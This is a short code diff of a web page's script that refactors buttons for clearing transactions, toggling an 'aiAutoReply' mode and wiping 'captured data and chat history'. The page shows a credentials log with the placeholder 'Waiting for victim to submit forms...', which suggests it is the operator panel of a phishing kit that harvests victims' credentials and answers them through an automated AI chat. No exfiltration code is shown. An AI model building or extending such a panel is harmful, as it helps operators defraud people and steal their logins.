-            let currentState = getSyncItem('aiAutoReply') || false;
-            let newState = !currentState;
-            await setSyncItem('aiAutoReply', newState);
-        }
-        
-        async function clearData() {
-            if(confirm('Are you sure you want to clear all captured data and chat history?')) {
-                await setFullState({}); globalState = {};
+
+        // Clear All Transactions
+        document.getElementById('btnClearTx').addEventListener('click', async function() {
+            if (confirm('Clear all custom transactions?')) {
+                await setSyncItem('transactions', null);
+            }
+        });
+
+        // AI Toggle
+        document.getElementById('aiToggleBtn').addEventListener('click', async function() {
+            var currentState = getSyncItem('aiAutoReply') || false;
+            await setSyncItem('aiAutoReply', !currentState);
+        });
+
+        // Clear All Data
+        document.getElementById('clearAllBtn').addEventListener('click', async function() {
+            if (confirm('Clear all captured data and chat history?')) {
+                await setFullState({});
+                globalState = {};
                 document.getElementById('credentialsLog').innerHTML = '<p style="color:#666;">Waiting for victim to submit forms...</p>';
                 document.getElementById('chatLog').innerHTML = '';
             }
-        }
+        });
     </script>
 </body>
 </html>
